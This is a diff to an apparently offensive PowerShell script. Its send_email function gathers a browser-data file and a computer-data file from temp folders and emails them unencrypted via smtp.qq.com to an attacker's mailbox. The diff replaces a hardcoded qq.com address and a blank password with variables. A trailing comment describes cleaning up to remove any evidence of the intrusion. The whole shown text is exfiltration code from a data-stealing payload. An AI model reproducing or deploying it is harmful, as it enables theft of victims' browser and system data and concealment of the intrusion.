@@ -449,15 +449,14 @@ $output > $env:TEMP\$FolderName/computerData.txt
 function send_email {
 $p = $env:TMP + '\--BrowserData.txt'
 $c = $env:TEMP + '\' + $FolderName + '\' + 'computerData.txt'
-$c
-$From = "1411789366@qq.com"
-$To = "1411789366@qq.com"
+
+$From = $username + "@qq.com"
+$To = $username + "@qq.com"
 $Subject = "collect message" 
 $Body = "collect message"
 $smtpServer = "smtp.qq.com"
 $smtpPort = 25
-$username = "1411789366@qq.com"
-$password = ""
+$username = $username + "@qq.com"
 
 $SMTPMessage = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
 
@@ -469,7 +468,7 @@ $SMTPClient = New-Object Net.Mail.SmtpClient($smtpServer, $SmtpPort)
 
 $SMTPClient.EnableSsl = $false 
 
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($username, $password);
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($username, $epw)
 
 $SMTPClient.Send($SMTPMessage)
 }
@@ -478,7 +477,6 @@ send_email
 
 
 <#
-.NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 
